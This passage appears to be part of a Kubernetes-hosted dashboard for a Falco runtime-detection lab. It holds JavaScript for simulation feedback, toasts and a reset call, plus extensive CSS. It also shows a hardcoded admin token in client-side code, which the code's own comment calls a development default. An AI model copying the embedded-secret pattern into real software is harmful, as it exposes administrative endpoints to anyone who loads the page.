        // 7. Bounded timeout reached without real detection alert
        $('fb-step-detect').className = 'fb-step failed';
        if (card) card.className = 'simulation-feedback error';
        if (dot) dot.className = 'feedback-status-dot error';
    
        if (title) title.textContent = `Detection Timeout (No Alert Received)`;
        if (body) {
          body.innerHTML = `
            Simulation command executed in <code>${targetPod || 'victim'}</code> (${simData.duration_s} s), but no matching alert (${expectedRules.join(', ')}) was received from the Falco &rarr; Controller pipeline within 14 s.
            <div style="margin-top:4px;font-size:11px;color:var(--text-muted)">
              Check that Falco daemonset and Falcosidekick pods are healthy.
            </div>
          `;
        }
      }
    
      // Cleanup button states
      setTimeout(() => {
        btn.classList.remove('loading', 'active-injecting');
        setButtonsDisabled(false);
        isSimulationRunning = false;
      }, 1000);
    }
    
    function initCopyButtons() {
      document.querySelectorAll('.copy-btn').forEach(btn => {
        btn.addEventListener('click', () => {
          const code = btn.previousElementSibling?.textContent?.trim();
          if (!code) return;
          navigator.clipboard.writeText(code).then(() => {
            btn.textContent = '✓ Copied';
            btn.classList.add('copied');
            setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
          });
        });
      });
    }
    
    // ─── Init ─────────────────────────────────────────────────────────────────────
    document.addEventListener('DOMContentLoaded', () => {
      // Initial render of empty states
      $('last-updated').textContent = 'Connecting…';
      initCopyButtons();
      initThreatInjection();
      initReset();
    
      // First poll immediately, then repeat
      poll();
      setInterval(poll, POLL_MS);
    });
    
    
    // ─── Toast notification system ────────────────────────────────────────────────
    (function ensureToastContainer() {
      if (!document.getElementById('toast-container')) {
        const tc = document.createElement('div');
        tc.id = 'toast-container';
        document.body.appendChild(tc);
      }
    })();
    
    /**
     * Show a brief toast notification.
     * @param {'success'|'error'|'info'} type
     * @param {string} title  Bold heading text
     * @param {string} body   Supporting text (optional)
     * @param {number} durationMs  Auto-dismiss after this many ms (default 4000)
     */
    function showToast(type, title, body = '', durationMs = 4000) {
      let container = document.getElementById('toast-container');
      if (!container) {
        container = document.createElement('div');
        container.id = 'toast-container';
        document.body.appendChild(container);
      }
    
      const icons = { success: '✅', error: '❌', info: 'ℹ️' };
      const toast = document.createElement('div');
      toast.className = `toast toast-${type}`;
      toast.setAttribute('role', 'status');
      toast.setAttribute('aria-live', 'polite');
      toast.innerHTML = `
        <span class="toast-icon" aria-hidden="true">${icons[type] || 'ℹ️'}</span>
        <span class="toast-msg">
          <strong>${escHtml(title)}</strong>
          ${body ? escHtml(body) : ''}
        </span>
        <button class="toast-close" aria-label="Dismiss notification" title="Dismiss">×</button>
      `;
    
      function dismiss() {
        toast.classList.add('toast-leaving');
        toast.addEventListener('animationend', () => toast.remove(), { once: true });
      }
    
      toast.querySelector('.toast-close').addEventListener('click', dismiss);
      container.appendChild(toast);
    
      if (durationMs > 0) {
        setTimeout(dismiss, durationMs);
      }
    }
    
    function escHtml(s) {
      return String(s)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
    }
    
    // ─── Reset Test Results ────────────────────────────────────────────────────────
    
    /**
     * The admin token is the default dev token shipped with the controller.
     * In a real deployment this would come from a server-side session or
     * environment-specific configuration — never hardcoded secrets.
     * The controller defaults to "rtm-reset-dev-token" when ADMIN_TOKEN is unset.
     */
    const ADMIN_TOKEN = 'rtm-reset-dev-token';
    
    let isResetting = false;
    
    function buildConfirmModal() {
      const overlay = document.createElement('div');
      overlay.className = 'confirm-overlay hidden';
      overlay.id = 'reset-confirm-overlay';
      overlay.setAttribute('role', 'dialog');
      overlay.setAttribute('aria-modal', 'true');
      overlay.setAttribute('aria-labelledby', 'reset-dialog-title');
    
      overlay.innerHTML = `
        <div class="confirm-dialog">
          <h3 id="reset-dialog-title">⚠️ Reset Test Results?</h3>
          <p>This will immediately clear the following controller-side in-memory state:</p>
          <ul>
            <li>Alert ring buffer (all stored RTM alerts)</li>
            <li>Deduplication timestamps (per pod/rule)</li>
            <li>Pod event history (used for escalation decisions)</li>
            <li>Action-tracking state (isolate / kill already taken)</li>
          </ul>
          <div class="confirm-note">
            <strong>Note:</strong> This does <em>not</em> clear Falco's own kernel/log state,
            reverse previously executed Kubernetes actions, cancel running simulations,
            or change the strategy, dry-run setting, or enforcement selectors.
          </div>
          <div class="confirm-actions">
            <button class="confirm-cancel" id="reset-cancel-btn" type="button">Cancel</button>
            <button class="confirm-proceed" id="reset-proceed-btn" type="button">Yes, Reset</button>
          </div>
        </div>
      `;
    
      document.body.appendChild(overlay);
    
      // Close on overlay backdrop click
      overlay.addEventListener('click', (e) => {
        if (e.target === overlay) closeConfirmModal();
      });
    
      // Close on Escape
      document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape' && !overlay.classList.contains('hidden')) {
          closeConfirmModal();
        }
      });
    
      document.getElementById('reset-cancel-btn').addEventListener('click', closeConfirmModal);
      document.getElementById('reset-proceed-btn').addEventListener('click', executeReset);
    
      return overlay;
    }
    
    function openConfirmModal() {
      let overlay = document.getElementById('reset-confirm-overlay');
      if (!overlay) overlay = buildConfirmModal();
      overlay.classList.remove('hidden');
      // Focus the cancel button by default (safer default for destructive dialogs)
      const cancelBtn = document.getElementById('reset-cancel-btn');
      if (cancelBtn) setTimeout(() => cancelBtn.focus(), 50);
    }
    
    function closeConfirmModal() {
      const overlay = document.getElementById('reset-confirm-overlay');
      if (overlay) overlay.classList.add('hidden');
    }
    
    async function executeReset() {
      if (isResetting) return;
      isResetting = true;
      closeConfirmModal();
    
      const btn = document.getElementById('reset-btn');
      if (btn) {
        btn.disabled = true;
        btn.classList.add('loading');
        btn.querySelector('.reset-btn-icon').textContent = '↺';
      }
    
      try {
        const res = await fetch(API_BASE + '/admin/reset-test-results', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-RTM-Admin-Token': ADMIN_TOKEN,
          },
        });
    
        if (!res.ok) {
          let detail = `HTTP ${res.status}`;
          try {
            const errJson = await res.json();
            if (errJson.detail) detail = errJson.detail;
          } catch (_) {}
    
          showToast('error', 'Reset Failed', detail, 6000);
          return;
        }
    
        const data = await res.json();
    
        // Clear client-side state only after backend confirms success
        knownAlertIds.clear();
    
        // Trigger an immediate dashboard refresh
        await poll();
    
        showToast('success', 'Test Results Reset', 'Alert history and decision engine state cleared.', 5000);
        console.info('[RTM] Reset complete:', data);
    
      } catch (err) {
        showToast('error', 'Reset Failed', `Network error: ${err.message}`, 6000);
      } finally {
        isResetting = false;
        if (btn) {
          btn.disabled = false;
          btn.classList.remove('loading');
          btn.querySelector('.reset-btn-icon').textContent = '↺';
        }
      }
    }
    
    function initReset() {
      const btn = document.getElementById('reset-btn');
      if (!btn) {
        console.warn('[RTM] Reset button #reset-btn not found in DOM.');
        return;
      }
      btn.addEventListener('click', () => {
        if (isResetting) return;
        openConfirmModal();
      });
    }
  style.css: |
    /* RTM Dashboard — style.css
       Dark-mode glassmorphism. No framework, no build step. */
    
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&family=JetBrains+Mono:wght@400;500&display=swap');
    
    /* ═══════════════════════════════════════════════════════════
       ROOT TOKENS
       ══════════════════════════════════════════════════════════ */
    :root {
      --bg-base:        #0a0d14;
      --bg-panel:       rgba(255,255,255,0.04);
      --bg-panel-hover: rgba(255,255,255,0.07);
      --border:         rgba(255,255,255,0.08);
      --border-bright:  rgba(255,255,255,0.15);
    
      --accent:         #6366f1;       /* indigo */
      --accent-glow:    rgba(99,102,241,0.3);
      --green:          #22d3a0;
      --green-glow:     rgba(34,211,160,0.25);
      --yellow:         #f59e0b;
      --red:            #ef4444;
      --red-glow:       rgba(239,68,68,0.3);
      --orange:         #fb923c;
      --muted:          rgba(255,255,255,0.35);
    
      --text-primary:   #f0f4ff;
      --text-secondary: rgba(240,244,255,0.6);
      --text-muted:     rgba(240,244,255,0.35);
    
      --radius:         12px;
      --radius-sm:      8px;
      --radius-xs:      5px;
      --transition:     0.2s ease;
    
      --font:     'Inter', system-ui, sans-serif;
      --mono:     'JetBrains Mono', 'Fira Code', monospace;
    }
    
    /* ═══════════════════════════════════════════════════════════
       RESET & BASE
       ══════════════════════════════════════════════════════════ */
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    
    html { scroll-behavior: smooth; }
    
    body {
      font-family: var(--font);
      background: var(--bg-base);
      color: var(--text-primary);
      min-height: 100vh;
      line-height: 1.5;
      -webkit-font-smoothing: antialiased;
      background-image:
        radial-gradient(ellipse 800px 600px at 20% 10%, rgba(99,102,241,0.07) 0%, transparent 70%),
        radial-gradient(ellipse 600px 400px at 80% 80%, rgba(34,211,160,0.05) 0%, transparent 70%);
      background-attachment: fixed;
    }
    
    a { color: var(--accent); text-decoration: none; }
    code, pre { font-family: var(--mono); }
    
    /* ═══════════════════════════════════════════════════════════
       LAYOUT
       ══════════════════════════════════════════════════════════ */
    .app-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 16px 28px;
      border-bottom: 1px solid var(--border);
      background: rgba(10,13,20,0.85);
      backdrop-filter: blur(12px);
      position: sticky;
      top: 0;
      z-index: 100;
      gap: 16px;
    }
    
    .header-brand {
      display: flex;
      align-items: center;
      gap: 12px;
    }
    
    .header-brand .logo {
      width: 36px; height: 36px;
      border-radius: 9px;
      background: linear-gradient(135deg, var(--accent), #a855f7);
      display: flex; align-items: center; justify-content: center;
      font-size: 18px;
      box-shadow: 0 0 20px var(--accent-glow);
    }
    
    .header-brand h1 {
      font-size: 17px;
      font-weight: 700;
      letter-spacing: -0.3px;
    }
    
    .header-brand .subtitle {
      font-size: 11px;
      color: var(--text-muted);
      font-weight: 400;
      letter-spacing: 0.5px;
      text-transform: uppercase;
    }
    
    .header-right {
      display: flex;
      align-items: center;
      gap: 16px;
    }
    
    .status-dot-wrap {
      display: flex;
      align-items: center;
      gap: 7px;
      font-size: 12px;
      color: var(--text-secondary);
    }
    
    .status-dot {
      width: 8px; height: 8px;
      border-radius: 50%;
      background: var(--green);
      box-shadow: 0 0 8px var(--green-glow);
      animation: pulse 2s infinite;
    }
    .status-dot.error { background: var(--red); box-shadow: 0 0 8px var(--red-glow); animation: none; }
    .status-dot.stale { background: var(--yellow); box-shadow: none; animation: none; }
    
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50%       { opacity: 0.4; }
    }
    
    .last-updated {
      font-size: 11px;
      color: var(--text-muted);
      font-family: var(--mono);
    }
    
    .main-content {
      max-width: 1400px;
      margin: 0 auto;
      padding: 24px 24px 48px;
      display: flex;
      flex-direction: column;
      gap: 24px;
    }
    
    /* ═══════════════════════════════════════════════════════════
       STALE / ERROR BANNER
       ══════════════════════════════════════════════════════════ */
    .stale-banner {
      display: none;
      background: rgba(239,68,68,0.12);
      border: 1px solid rgba(239,68,68,0.4);
      border-radius: var(--radius-sm);
      padding: 12px 18px;
      font-size: 13px;
      color: #fca5a5;
      gap: 10px;
      align-items: center;
    }
    .stale-banner.visible { display: flex; }
    .stale-banner .stale-icon { font-size: 18px; }
    
    /* ═══════════════════════════════════════════════════════════
       CONFIG BANNER
       ══════════════════════════════════════════════════════════ */
    .config-banner {
      display: flex;
      align-items: center;
      gap: 12px;
      background: var(--bg-panel);
      border: 1px solid var(--border);
      border-radius: var(--radius-sm);
      padding: 12px 20px;
      flex-wrap: wrap;
    }
    
    .config-banner .config-label {
      font-size: 11px;
      text-transform: uppercase;
      letter-spacing: 0.8px;
      color: var(--text-muted);
      margin-right: 4px;
    }
    
    .config-chip {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      padding: 4px 10px;
      border-radius: 99px;
      font-size: 12px;
      font-weight: 500;
      font-family: var(--mono);
      background: rgba(99,102,241,0.15);
      border: 1px solid rgba(99,102,241,0.35);
      color: #a5b4fc;
    }
    
    .config-chip.dry-run-true {
      background: rgba(245,158,11,0.15);
      border-color: rgba(245,158,11,0.35);
      color: #fcd34d;
    }
    
    .config-chip.dry-run-false {
      background: rgba(239,68,68,0.15);
      border-color: rgba(239,68,68,0.35);
      color: #fca5a5;
    }
    
    /* ═══════════════════════════════════════════════════════════
       PIPELINE STRIP
       ══════════════════════════════════════════════════════════ */
    .panel {
      background: var(--bg-panel);
      border: 1px solid var(--border);
      border-radius: var(--radius);
      padding: 20px 24px;
    }
    
    .panel-title {
      font-size: 12px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 1px;
      color: var(--text-muted);
      margin-bottom: 18px;
    }
    
    .pipeline-strip {
      display: flex;
      align-items: center;
      gap: 0;
      overflow-x: auto;
      padding-bottom: 4px;
    }
    
    .pipeline-step {
      display: flex;
      flex-direction: column;
      align-items: center;
      min-width: 110px;
      gap: 8px;
      opacity: 0.3;
      transition: opacity var(--transition), filter var(--transition);
      flex: 1;
    }
    
    .pipeline-step.active {
      opacity: 1;
    }
    
    .step-icon-wrap {
      width: 48px; height: 48px;
      border-radius: 50%;
      display: flex; align-items: center; justify-content: center;
      font-size: 20px;
      background: rgba(255,255,255,0.05);
      border: 2px solid var(--border);
      transition: border-color var(--transition), box-shadow var(--transition), background var(--transition);
      position: relative;
    }
    
    .pipeline-step.active .step-icon-wrap {
      border-color: var(--green);
      background: rgba(34,211,160,0.1);
      box-shadow: 0 0 16px var(--green-glow);
    }
    
    .pipeline-step.active.warn .step-icon-wrap {
      border-color: var(--yellow);
      background: rgba(245,158,11,0.1);
      box-shadow: 0 0 16px rgba(245,158,11,0.25);
    }
    
    .pipeline-step.active.danger .step-icon-wrap {
      border-color: var(--red);
      background: rgba(239,68,68,0.1);
      box-shadow: 0 0 16px var(--red-glow);
    }
    
    .step-label {
      font-size: 10px;
      font-weight: 600;
      text-align: center;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      color: var(--text-secondary);
      line-height: 1.3;
    }
    
    .pipeline-arrow {
      color: var(--border-bright);
      font-size: 18px;
      flex-shrink: 0;
      padding: 0 4px;
      padding-bottom: 24px;
      user-select: none;
    }
    
    /* ═══════════════════════════════════════════════════════════
       STATS ROW
       ══════════════════════════════════════════════════════════ */
    .stats-row {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 16px;
    }
    
    .stat-card {
      background: var(--bg-panel);
      border: 1px solid var(--border);
      border-radius: var(--radius-sm);
      padding: 16px 20px;
      display: flex;
      flex-direction: column;
      gap: 4px;
    }
    
    .stat-value {
      font-size: 28px;
      font-weight: 700;
      font-family: var(--mono);
      line-height: 1;
      color: var(--text-primary);
    }
    
    .stat-value.green { color: var(--green); }
    .stat-value.yellow { color: var(--yellow); }
    .stat-value.red { color: var(--red); }
    
    .stat-label {
      font-size: 11px;
      text-transform: uppercase;
      letter-spacing: 0.8px;
      color: var(--text-muted);
    }
    
    /* ═══════════════════════════════════════════════════════════
       ALERT TABLE
       ══════════════════════════════════════════════════════════ */
    .alert-table-wrap {
      overflow-x: auto;
      border-radius: var(--radius-sm);
      border: 1px solid var(--border);
    }
    
    .alert-table {
      width: 100%;
      border-collapse: collapse;
      font-size: 12px;
    }
    
    .alert-table thead th {
      padding: 10px 14px;
      text-align: left;
      font-weight: 600;
      font-size: 10px;
      text-transform: uppercase;
      letter-spacing: 0.8px;
      color: var(--text-muted);
      background: rgba(255,255,255,0.03);
      border-bottom: 1px solid var(--border);
      white-space: nowrap;
    }
    
    .alert-table tbody tr {
      border-bottom: 1px solid rgba(255,255,255,0.04);
      transition: background var(--transition);
    }
    
    .alert-table tbody tr:hover {
      background: var(--bg-panel-hover);
    }
    
    .alert-table tbody tr.new-row {
      animation: flashRow 0.7s ease-out;
    }
    
    @keyframes flashRow {
      0%   { background: rgba(99,102,241,0.2); }
      100% { background: transparent; }
    }
    
    .alert-table tbody td {
      padding: 9px 14px;
      color: var(--text-secondary);
      vertical-align: middle;
      white-space: nowrap;
      font-family: var(--mono);
      font-size: 11px;
    }
    
    .alert-table tbody td:first-child { color: var(--text-muted); font-size: 10px; }
    
    /* Badges */
    .badge {
      display: inline-flex;
      align-items: center;
      padding: 2px 8px;
      border-radius: 99px;
      font-size: 10px;
      font-weight: 600;
      font-family: var(--font);
      white-space: nowrap;
    }
    
    .badge-rtm   { background: rgba(99,102,241,0.2); color: #a5b4fc; border: 1px solid rgba(99,102,241,0.3); }
    .badge-green { background: rgba(34,211,160,0.15); color: var(--green); border: 1px solid rgba(34,211,160,0.3); }
    .badge-yellow{ background: rgba(245,158,11,0.15); color: var(--yellow); border: 1px solid rgba(245,158,11,0.3); }
    .badge-red   { background: rgba(239,68,68,0.15); color: var(--red); border: 1px solid rgba(239,68,68,0.3); }
    .badge-orange{ background: rgba(251,146,60,0.15); color: var(--orange); border: 1px solid rgba(251,146,60,0.3); }
    .badge-muted { background: rgba(255,255,255,0.07); color: var(--text-muted); border: 1px solid var(--border); }
    
    .action-badge { min-width: 110px; justify-content: center; }
    
    /* Empty state */
    .table-empty {
      text-align: center;
      padding: 48px;
      color: var(--text-muted);
      font-size: 13px;
    }
    .table-empty .empty-icon { font-size: 36px; display: block; margin-bottom: 12px; }
    
    /* ═══════════════════════════════════════════════════════════
       POD GRID
       ══════════════════════════════════════════════════════════ */
    .pod-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
      gap: 12px;
    }
    
    .pod-card {
      background: var(--bg-panel);
      border: 1px solid var(--border);
      border-radius: var(--radius-sm);
      padding: 14px 16px;
      display: flex;
      flex-direction: column;
      gap: 8px;
      transition: border-color var(--transition), background var(--transition);
    }
    
    .pod-card:hover {
      background: var(--bg-panel-hover);
      border-color: var(--border-bright);
    }
    
    .pod-card.enforced {
      border-color: rgba(34,211,160,0.3);
      background: rgba(34,211,160,0.04);
    }
    
    .pod-card.restricted {
      border-color: rgba(245,158,11,0.4);
      background: rgba(245,158,11,0.06);
      animation: restrictPulse 3s ease-in-out infinite;
    }
    
    @keyframes restrictPulse {
      0%, 100% { box-shadow: none; }
      50%       { box-shadow: 0 0 18px rgba(245,158,11,0.15); }
    }
    
    .pod-name {
      font-family: var(--mono);
      font-size: 11px;
      font-weight: 500;
      color: var(--text-primary);
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
    }
    
    .pod-labels {
      display: flex;
      flex-wrap: wrap;
      gap: 4px;
    }
    
    .pod-meta {
      display: flex;
      align-items: center;
      justify-content: space-between;
      font-size: 10px;
      color: var(--text-muted);
    }
    
    .pod-phase {
      display: flex;
      align-items: center;
      gap: 4px;
    }
    
    .pod-phase::before {
      content: '';
      width: 6px; height: 6px;
      border-radius: 50%;
      background: var(--muted);
    }
    
    .pod-phase.running::before { background: var(--green); }
    .pod-phase.pending::before { background: var(--yellow); }
    .pod-phase.failed::before  { background: var(--red); }
    
    /* ═══════════════════════════════════════════════════════════
       ATTACK PANEL
       ══════════════════════════════════════════════════════════ */
    .attack-panel {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
      gap: 10px;
    }
    
    .attack-cmd {
      background: rgba(0,0,0,0.4);
      border: 1px solid var(--border);
      border-radius: var(--radius-sm);
      padding: 12px 14px;
      display: flex;
      align-items: flex-start;
      justify-content: space-between;
      gap: 10px;
    }
    
    .attack-cmd code {
      font-size: 10px;
      color: #86efac;
      line-height: 1.6;
      flex: 1;
      word-break: break-all;
    }
    
    .copy-btn {
      background: rgba(99,102,241,0.15);
      border: 1px solid rgba(99,102,241,0.3);
      color: #a5b4fc;
      border-radius: var(--radius-xs);
      padding: 4px 10px;
      font-size: 10px;
      font-weight: 600;
      cursor: pointer;
      white-space: nowrap;
      transition: background var(--transition), color var(--transition);
      font-family: var(--font);
      flex-shrink: 0;
    }
    
    .copy-btn:hover { background: rgba(99,102,241,0.3); color: #c7d2fe; }
    .copy-btn.copied { background: rgba(34,211,160,0.2); border-color: rgba(34,211,160,0.4); color: var(--green); }
    
    .attack-note {
      font-size: 11px;
      color: var(--text-muted);
      background: rgba(245,158,11,0.08);
      border: 1px solid rgba(245,158,11,0.2);
      border-radius: var(--radius-xs);
      padding: 8px 12px;
      margin-bottom: 10px;
      grid-column: 1 / -1;
    }
    
    /* ═══════════════════════════════════════════════════════════
       TWO-COLUMN LAYOUT
       ══════════════════════════════════════════════════════════ */
    .two-col {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 24px;
    }
    
    @media (max-width: 900px) {
      .two-col { grid-template-columns: 1fr; }
      .stats-row { grid-template-columns: repeat(2, 1fr); }
      .pipeline-step { min-width: 80px; }
    }
    
    /* ═══════════════════════════════════════════════════════════
       SCROLLBAR
       ══════════════════════════════════════════════════════════ */
    ::-webkit-scrollbar { width: 6px; height: 6px; }
    ::-webkit-scrollbar-track { background: transparent; }
    ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.12); border-radius: 3px; }
    ::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.2); }
    
    
    /* ???????????????????????????????????????????????????????????
       INJECT THREAT SECTION
       ?????????????????????????????????????????????????????????? */
    .panel-header-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 8px;
      flex-wrap: wrap;
      gap: 8px;
    }
    
    .threat-target-badge {
      font-family: var(--mono);
      font-size: 11px;
      color: var(--green);
      background: rgba(34, 211, 160, 0.1);
      border: 1px solid rgba(34, 211, 160, 0.25);
      border-radius: var(--radius-xs);
      padding: 3px 8px;
    }
    
    .threat-desc {
      font-size: 12px;
      color: var(--text-secondary);
      margin-bottom: 14px;
      line-height: 1.4;
    }
    
    .threat-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 12px;
      margin-bottom: 16px;
    }
    
    @media (max-width: 600px) {
      .threat-grid {
        grid-template-columns: 1fr;
      }
    }
    
    .threat-btn {
      background: rgba(255, 255, 255, 0.03);
      border: 1px solid var(--border);
      border-radius: var(--radius-sm);
      padding: 14px 16px;
      text-align: left;
      cursor: pointer;
      transition: all var(--transition);
      position: relative;
      font-family: var(--font);
      color: var(--text-primary);
      outline: none;
      user-select: none;
    }
    
    .threat-btn:hover:not(:disabled) {
      background: rgba(255, 255, 255, 0.06);
      border-color: var(--accent);
      transform: translateY(-2px);
      box-shadow: 0 4px 16px var(--accent-glow);
    }
    
    .threat-btn:active:not(:disabled) {
      transform: translateY(0);
    }
    
    .threat-btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }
    
    .threat-btn.active-injecting {
      border-color: var(--yellow);
      box-shadow: 0 0 15px rgba(245, 158, 11, 0.3);
    }
    
    .threat-btn-top {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 6px;
    }
    
    .threat-id {
      font-family: var(--mono);
      font-weight: 700;
      font-size: 13px;
      color: var(--accent);
    }
    
    .threat-rule-tag {
      font-family: var(--mono);
      font-size: 10px;
      padding: 2px 6px;
      border-radius: var(--radius-xs);
      background: rgba(99, 102, 241, 0.15);
      color: #c7d2fe;
      border: 1px solid rgba(99, 102, 241, 0.3);
    }
    
    .threat-name {
      font-weight: 600;
      font-size: 14px;
      color: var(--text-primary);
      margin-bottom: 2px;
    }
    
    .threat-subtitle {
      font-family: var(--mono);
      font-size: 11px;
      color: var(--text-muted);
    }
    
    .threat-spinner {
      display: none;
      width: 14px;
      height: 14px;
      border: 2px solid rgba(255, 255, 255, 0.2);
      border-top-color: var(--yellow);
      border-radius: 50%;
      animation: threat-spin 0.8s linear infinite;
      position: absolute;
      top: 14px;
      right: 14px;
    }
    
    .threat-btn.loading .threat-spinner {
      display: block;
    }
    
    .threat-btn.loading .threat-rule-tag {
      display: none;
    }
    
    @keyframes threat-spin {
      to { transform: rotate(360deg); }
    }
    
    /* ???????????????????????????????????????????????????????????
       SIMULATION FEEDBACK CARD
       ?????????????????????????????????????????????????????????? */
    .simulation-feedback {
      background: rgba(0, 0, 0, 0.35);
      border: 1px solid var(--border);
      border-radius: var(--radius-sm);
      padding: 12px 14px;
      margin-bottom: 14px;
      transition: all var(--transition);
    }
    
    .simulation-feedback.running {
      border-color: rgba(245, 158, 11, 0.4);
      background: rgba(245, 158, 11, 0.05);
    }
    
    .simulation-feedback.success {
      border-color: rgba(34, 211, 160, 0.4);
      background: rgba(34, 211, 160, 0.05);
    }
    
    .simulation-feedback.error {
      border-color: rgba(239, 68, 68, 0.4);
      background: rgba(239, 68, 68, 0.05);
    }
    
    .feedback-header {
      display: flex;
      align-items: center;
      gap: 8px;
    }
    
    .feedback-status-dot {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      flex-shrink: 0;
    }
    
    .feedback-status-dot.idle {
      background: var(--muted);
    }
    
    .feedback-status-dot.running {
      background: var(--yellow);
      box-shadow: 0 0 8px var(--yellow);
      animation: pulse-dot 1.2s infinite;
    }
    
    .feedback-status-dot.success {
      background: var(--green);
      box-shadow: 0 0 8px var(--green-glow);
    }
    
    .feedback-status-dot.error {
      background: var(--red);
      box-shadow: 0 0 8px var(--red-glow);
    }
    
    .feedback-title {
      font-weight: 600;
      font-size: 13px;
      color: var(--text-primary);
    }
    
    .feedback-sim-id {
      font-family: var(--mono);
      font-size: 10px;
      color: var(--text-muted);
      margin-left: auto;
    }
    
    .feedback-body {
      font-size: 12px;
      color: var(--text-secondary);
      margin-top: 6px;
      line-height: 1.45;
    }
    
    .feedback-pipeline-steps {
      display: flex;
      align-items: center;
      gap: 6px;
      margin-top: 10px;
      padding-top: 8px;
      border-top: 1px solid rgba(255, 255, 255, 0.06);
      flex-wrap: wrap;
    }
    
    .fb-step {
      display: flex;
      align-items: center;
      gap: 5px;
      font-size: 11px;
      color: var(--text-muted);
      background: rgba(255, 255, 255, 0.03);
      padding: 3px 8px;
      border-radius: var(--radius-xs);
      border: 1px solid var(--border);
      transition: all var(--transition);
    }
    
    .fb-step.active {
      color: var(--yellow);
      border-color: rgba(245, 158, 11, 0.4);
      background: rgba(245, 158, 11, 0.1);
    }
    
    .fb-step.done {
      color: var(--green);
      border-color: rgba(34, 211, 160, 0.4);
      background: rgba(34, 211, 160, 0.1);
    }
    
    .fb-step.failed {
      color: var(--red);
      border-color: rgba(239, 68, 68, 0.4);
      background: rgba(239, 68, 68, 0.1);
    }
    
    .fb-step-icon {
      font-size: 10px;
      font-weight: 700;
      font-family: var(--mono);
    }
    
    .fb-arrow {
      color: var(--text-muted);
      font-size: 10px;
    }
    
    .manual-terminal-details summary {
      font-size: 11px;
      color: var(--text-muted);
      cursor: pointer;
      user-select: none;
      margin-top: 8px;
      outline: none;
    }
    
    .manual-terminal-details summary:hover {
      color: var(--text-secondary);
    }
    
    
    /* ═══════════════════════════════════════════════════════════
       ALERT TABLE HEADER ROW (title + reset button)
       ══════════════════════════════════════════════════════════ */
    .panel-title-row {
      display: flex;
      align-items: center;
      justify-content: space-between;
      flex-wrap: wrap;
      gap: 8px;
      margin-bottom: 0;
    }
    
    /* ═══════════════════════════════════════════════════════════
       RESET TEST RESULTS BUTTON
       ══════════════════════════════════════════════════════════ */
    .reset-btn {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      background: rgba(239, 68, 68, 0.10);
      border: 1px solid rgba(239, 68, 68, 0.35);
      color: #fca5a5;
      border-radius: var(--radius-xs);
      padding: 5px 12px;
      font-family: var(--font);
      font-size: 11px;
      font-weight: 600;
      letter-spacing: 0.3px;
      cursor: pointer;
      transition: all var(--transition);
      outline: none;
      white-space: nowrap;
      user-select: none;
    }
    
    .reset-btn:hover:not(:disabled) {
      background: rgba(239, 68, 68, 0.22);
      border-color: rgba(239, 68, 68, 0.6);
      color: #fecaca;
      box-shadow: 0 0 10px rgba(239, 68, 68, 0.25);
    }
    
    .reset-btn:focus-visible {
      outline: 2px solid rgba(239, 68, 68, 0.5);
      outline-offset: 2px;
    }
    
    .reset-btn:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }
    
    .reset-btn.loading .reset-btn-icon {
      display: inline-block;
      animation: reset-spin 0.8s linear infinite;
    }
    
    .reset-btn-icon {
      font-size: 13px;
      line-height: 1;
    }
    
    @keyframes reset-spin {
      to { transform: rotate(-360deg); }
    }
    
    /* ═══════════════════════════════════════════════════════════
       CONFIRM MODAL (reset confirmation dialog)
       ══════════════════════════════════════════════════════════ */
    .confirm-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.65);
      backdrop-filter: blur(3px);
      z-index: 9000;
      display: flex;
      align-items: center;
      justify-content: center;
      animation: overlay-in 0.15s ease;
    }
    
    .confirm-overlay.hidden {
      display: none;
    }
    
    @keyframes overlay-in {
      from { opacity: 0; }
      to   { opacity: 1; }
    }
    
    .confirm-dialog {
      background: var(--panel-bg);
      border: 1px solid rgba(239, 68, 68, 0.4);
      border-radius: var(--radius);
      padding: 24px 28px;
      max-width: 480px;
      width: 90%;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(255,255,255,0.04);
      animation: dialog-in 0.18s cubic-bezier(0.34, 1.56, 0.64, 1);
    }
    
    @keyframes dialog-in {
      from { opacity: 0; transform: scale(0.94) translateY(-8px); }
      to   { opacity: 1; transform: scale(1)   translateY(0); }
    }
    
    .confirm-dialog h3 {
      font-size: 15px;
      font-weight: 700;
      color: #fca5a5;
      margin: 0 0 12px 0;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    
    .confirm-dialog p {
      font-size: 12px;
      color: var(--text-secondary);
      margin: 0 0 8px 0;
      line-height: 1.5;
    }
    
    .confirm-dialog ul {
      font-size: 12px;
      color: var(--text-secondary);
      margin: 0 0 12px 16px;
      padding: 0;
      line-height: 1.6;
    }
    
    .confirm-dialog .confirm-note {
      font-size: 11px;
      color: var(--text-muted);
      background: rgba(245, 158, 11, 0.08);
      border: 1px solid rgba(245, 158, 11, 0.2);
      border-radius: var(--radius-xs);
      padding: 8px 10px;
      margin-bottom: 16px;
      line-height: 1.5;
    }
    
    .confirm-actions {
